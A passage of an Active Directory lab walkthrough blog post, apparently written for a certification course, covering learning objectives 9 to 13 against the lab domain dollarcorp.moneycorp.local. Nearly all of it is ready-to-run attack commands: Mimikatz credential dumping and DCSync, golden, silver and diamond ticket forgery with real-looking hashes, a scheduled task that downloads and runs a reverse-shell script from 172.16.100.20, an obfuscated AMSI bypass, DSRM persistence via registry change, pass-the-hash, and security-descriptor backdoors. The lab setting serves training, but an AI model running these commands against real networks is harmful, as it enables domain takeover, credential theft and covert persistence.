</span><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::lsa /patch"'</span><span class="w">
</span></pre></table></code></div></div><p>We can also run DCSync from the process running as DA as such:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:dcorp\krbtgt"'</span><span class="w">
</span></pre></table></code></div></div><p>And create the golden ticket with:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid: S-1-5-21-719815819-3726368948-3917688648 /aes256:
154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span><span class="w">
</span></pre></table></code></div></div><p>and check with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">ls</span><span class="w"> </span><span class="nx">\\dcorp-dc</span><span class="w"> </span><span class="nx">\c</span><span class="err">$</span><span class="w">
</span></pre></table></code></div></div><p>We can also run WMI commands on the DC</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">gwmi</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">win32_computersystem</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-9"><span class="mr-2">Learning Objective 9</span><a href="#learning-objective-9" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Objective: Get command execution on the domain controller by creating silver ticket for Host service and WMI. From the information gathered in the previous objective, we have the hash for the machine account of the domain controller (dcorp-dc$). Using the below command we can create a Silver Ticket that provides us access to the HOST service of the DC. Run this command from an elevated shell:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid: S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:98fb9b154f614d933422b877cd3f2e98 /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></pre></table></code></div></div><p>Or you can use Invoke-Mimi for the same results using:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:98fb9b154f614d933422b877cd3f2e98 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span><span class="w">
</span></pre></table></code></div></div><p>In either case, you should see <code class="language-plaintext highlighter-rouge">Golden ticket for 'Administrator @ dollarcorp.moneycorp.local</code> successfully submitted for current session.</p><p>We can then start a listener and schedule a task to run the reverse shell script using Invoke-PowerShellTcpEx.ps1. First create a copy of Invoke-PowerShellTcp.ps1 and rename it Invoke-PowerShellTcpEx.ps1 and add the function call <code class="language-plaintext highlighter-rouge">Power -Reverse -IPAddress 172.16.100.20 -Port 443</code> to the end of the file. Then run the below command in the process where we injected the ticket for the HOST service. Make sure your listener is already running.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">schtasks</span><span class="w"> </span><span class="nx">/create</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nx">/SC</span><span class="w"> </span><span class="nx">Weekly</span><span class="w"> </span><span class="nx">/RU</span><span class="w"> </span><span class="s2">"NT Authority\SYSTEM"</span><span class="w"> </span><span class="nx">/TN</span><span class="w"> </span><span class="s2">"User520"</span><span class="w"> </span><span class="nx">/TR</span><span class="w"> </span><span class="s2">"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.20/InvokePowerShellTcpEx.ps1''')'"</span><span class="w">

</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/Run</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">dcorp-dc.dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nx">/TN</span><span class="w">
</span><span class="s2">"User520"</span><span class="w">
</span></pre></table></code></div></div><p>To access WMI, we need to create two tickets, one for the HOST service and another for RPCSS. run the below commands from an elevated shell.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden
/User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-
719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local
/service:HOST /rc4:98fb9b154f614d933422b877cd3f2e98 /startoffset:0 /endin:600
/renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></pre></table></code></div></div><p>Inject a ticket for RPCSS:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden
/User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-
719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local
/service:RPCSS /rc4:98fb9b154f614d933422b877cd3f2e98 /startoffset:0
/endin:600 /renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></pre></table></code></div></div><p>Check if the ticket is present with <code class="language-plaintext highlighter-rouge">klist</code> and look for <code class="language-plaintext highlighter-rouge">Server:RPCSS/dcorp-dc.dollarcorp.moneycorp.local</code> and <code class="language-plaintext highlighter-rouge">HOST/dcorp-dc.dollarcorp.moneycorp.local</code></p><p>Now run the WMI commands on the domain controller:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">

</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">win32_operatingsystem</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-10"><span class="mr-2">Learning Objective 10</span><a href="#learning-objective-10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We will use the domain admin prviliges obtained earlier to execute a Diamond Ticket attack. We can use Rubeus to execute the attack from cmd (run as admin)</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">diamond</span><span class="w"> </span><span class="nx">/krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848</span><span class="w"> </span><span class="nx">/tgtdeleg</span><span class="w"> </span><span class="nx">/enctype:aes</span><span class="w"> </span><span class="nx">/ticketuser:administrator</span><span class="w">
</span><span class="n">/domain:dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nx">/dc:dcorp-dc.dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nx">/ticketuserid:500</span><span class="w"> </span><span class="nx">/groups:512</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><p>Then access the DC using winrs from the new spawned process:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objetive-11"><span class="mr-2">Learning Objetive 11</span><a href="#learning-objetive-11" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Using DA privileges obtained earlier to abuse the DSRM credential for persistence. We can do this by opening a remote powershell session, or other tools like SafetyKatz, BetterSafetyKatz, etc.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\AD\Tools\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$sess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\AD\Tools\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Enter-PSSession</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">
</span><span class="p">[</span><span class="n">dcorp</span><span class="nt">-dc</span><span class="p">]:</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\svcadmin\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">S</span><span class="se">`e</span><span class="nx">T-It</span><span class="se">`e</span><span class="nx">m</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s1">'V'</span><span class="o">+</span><span class="s1">'aR'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'IA'</span><span class="w"> </span><span class="o">+</span><span class="w">
</span><span class="p">(</span><span class="s1">'blE:1'</span><span class="o">+</span><span class="s1">'q2'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">'uZ'</span><span class="o">+</span><span class="s1">'x'</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">[</span><span class="n">TYpE</span><span class="p">](</span><span class="w"> </span><span class="s2">"{1}{0}"</span><span class="nt">-F</span><span class="s1">'F'</span><span class="p">,</span><span class="s1">'rE'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="p">(</span><span class="w">
</span><span class="n">Get-varI</span><span class="se">`A`B</span><span class="nx">LE</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="s1">'1Q'</span><span class="o">+</span><span class="s1">'2U'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="s1">'zX'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="nt">-VaL</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="s2">"A</span><span class="se">`s</span><span class="s2">s</span><span class="se">`E</span><span class="s2">mbly"</span><span class="o">.</span><span class="s2">"GET</span><span class="se">`T</span><span class="s2">Y</span><span class="se">`P</span><span class="s2">e"</span><span class="p">((</span><span class="w">
</span><span class="s2">"{6}{3}{1}{4}{2}{0}{5}"</span><span class="w"> </span><span class="o">-</span><span class="w">
</span><span class="n">f</span><span class="p">(</span><span class="s1">'Uti'</span><span class="o">+</span><span class="s1">'l'</span><span class="p">),</span><span class="s1">'A'</span><span class="p">,(</span><span class="s1">'Am'</span><span class="o">+</span><span class="s1">'si'</span><span class="p">),(</span><span class="s1">'.Man'</span><span class="o">+</span><span class="s1">'age'</span><span class="o">+</span><span class="s1">'men'</span><span class="o">+</span><span class="s1">'t.'</span><span class="p">),(</span><span class="s1">'u'</span><span class="o">+</span><span class="s1">'to'</span><span class="o">+</span><span class="s1">'mation.'</span><span class="p">),</span><span class="s1">'
s'</span><span class="p">,(</span><span class="s1">'Syst'</span><span class="o">+</span><span class="s1">'em'</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="s2">"g</span><span class="se">`e</span><span class="s2">tf</span><span class="se">`i</span><span class="s2">ElD"</span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s2">"{0}{2}{1}"</span><span class="w"> </span><span class="o">-</span><span class="w">
</span><span class="n">f</span><span class="p">(</span><span class="s1">'a'</span><span class="o">+</span><span class="s1">'msi'</span><span class="p">),</span><span class="s1">'d'</span><span class="p">,(</span><span class="s1">'I'</span><span class="o">+</span><span class="s1">'nitF'</span><span class="o">+</span><span class="s1">'aile'</span><span class="p">)</span><span class="w"> </span><span class="p">),(</span><span class="w"> </span><span class="s2">"{2}{4}{0}{1}{3}"</span><span class="w"> </span><span class="nt">-f</span><span class="w">
</span><span class="p">(</span><span class="s1">'S'</span><span class="o">+</span><span class="s1">'tat'</span><span class="p">),</span><span class="s1">'i'</span><span class="p">,(</span><span class="s1">'Non'</span><span class="o">+</span><span class="s1">'Publ'</span><span class="o">+</span><span class="s1">'i'</span><span class="p">),</span><span class="s1">'c'</span><span class="p">,</span><span class="s1">'c,'</span><span class="w"> </span><span class="p">))</span><span class="o">.</span><span class="s2">"sE</span><span class="se">`T`V</span><span class="s2">aLUE"</span><span class="p">(</span><span class="w">
</span><span class="nv">${n`ULl}</span><span class="p">,</span><span class="nv">${t`RuE}</span><span class="w"> </span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">dcorp</span><span class="nt">-dc</span><span class="p">]:</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\svcadmin\Documents</span><span class="err">&gt;</span><span class="nx">exit</span><span class="w">
</span></pre></table></code></div></div><p>Then load the Invoke-Mimi script in the session:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="nx">C:\AD\Tools\Invoke-Mimi.ps1</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">
</span></pre></table></code></div></div><p>Then we will extract the SAM file from the DC. The Directory Services Restore Mode pasword is mapped to the local admin on the DC.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">

</span><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"token::elevate" "lsadump::sam"'</span><span class="w">
</span></pre></table></code></div></div><p>The DSRM admin is not allowed to logon to the DC from the network, so we can chagne the logon behavior for the account by modifying the registry on the DC as shown:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">New-ItemProperty</span><span class="w"> </span><span class="s2">"HKLM:\System\CurrentControlSet\Control\Lsa\"</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"DsrmAdminLogonBehavior"</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="nx">DWORD</span><span class="w">
</span></pre></table></code></div></div><p>Then from our local system we can pass the NTLM hash for the DSRM administrator and access the dc from our new session:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'</span><span class="w">

</span><span class="n">ls</span><span class="w"> </span><span class="nx">\\dcorp-dc.dollarcorp.moneycorp.local\c</span><span class="err">$</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-12"><span class="mr-2">Learning Objective 12</span><a href="#learning-objective-12" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In this objective we will be checking if our user has DCSync (replication) rights. If so, we will execute the DCsync attack to pull hashes and AES keys of krbtgt user, if not, we will add the replication rights for our user and then perform the attack.</p><p>We can check if we have replication rights using the following commands, where student520 is the username we want to check</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\PowerView.ps1</span><span class="w">
</span><span class="nx">Get-DomainObjectAcl</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="s2">"DC=dollarcorp,DC=moneycorp,DC=local"</span><span class="w"> </span><span class="nt">-SearchScope</span><span class="w"> </span><span class="nx">Base</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ObjectAceType</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'replication-get'</span><span class="p">)</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ActiveDirectoryRights</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'GenericAll'</span><span class="p">)}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Add-Member</span><span class="w"> </span><span class="nx">NoteProperty</span><span class="w"> </span><span class="s1">'IdentityName'</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Convert-SidToName</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="p">);</span><span class="bp">$_</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w">
</span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"student520"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>If we do not have the rights, we can add the rights by first starting a process as Domain Admin by running the below command from an elevated command prompt:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:svcadmin</span><span class="w"> </span><span class="nx">/aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011</span><span class="w"> </span><span class="nx">/opsec</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><p>Then run the below commands in the process spawned by rubeus to add the rights:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">

</span><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\PowerView.ps1</span><span class="w">

</span><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s1">'DC=dollarcorp,DC=moneycorp,DC=local'</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">student520</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">DCSync</span><span class="w"> </span><span class="nt">-PrincipalDomain</span><span class="w"> </span><span class="nx">dollarcorp.moneycorp.local</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">TargetDomain</span><span class="w"> </span><span class="nx">dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><p>Then check for rights again using the previous Get-DomainObjectAcl command, you should be looking for these strings to have <code class="language-plaintext highlighter-rouge">AccessAllowed</code></p><p><code class="language-plaintext highlighter-rouge">ObjectAceType : DS-Replication-Get-Changes-In-Filtered-Set</code></p><p><code class="language-plaintext highlighter-rouge">ObjectAceType : DS-Replication-Get-Changes</code></p><p><code class="language-plaintext highlighter-rouge">ObjectAceType : DS-Replication-Get-Changes-All</code></p><p>We can then use SafetyKatz.exe to get the hashes of the krbtgt or any other user, as the DC contains all the user’s secrets in the domain</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:dcorp\krbtgt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-13"><span class="mr-2">Learning Objective 13</span><a href="#learning-objective-13" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In this objective we will be modifying security descriptors on the domain controller to get access using PowerShell remoting and WMI without requiring administrator access. We will retreive the machine account hash from dcorp-dc without using administrator access and use that to execute a silver ticket attack to get code execution with WMI.</p><p>Once we have administrative privileges on a machine, we can modify the security descriptors of services to access the services without admin prviliges. Below command (to be run as DA) modifies the host security descriptors for WMI on the DC to allow the student to access WMI</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">

</span><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\RACE.ps1</span><span class="w">

</span><span class="n">Set-RemoteWMI</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">student520</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nt">-namespace</span><span class="w"> </span><span class="s1">'root\cimv2'</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><p>Now we can execute WMI queries on the DC as student520</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">gwmi</span><span class="w"> </span><span class="nt">-class</span><span class="w"> </span><span class="nx">win32_operatingsystem</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w">
</span></pre></table></code></div></div><p>Similar modifications can be done to PowerShell remoting configuration:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\RACE.ps1</span><span class="w">

</span><span class="n">Set-RemotePSRemoting</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">studentx</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc.dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><p>And now we can run commands using powershell remoting on the DC without DA privileges</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
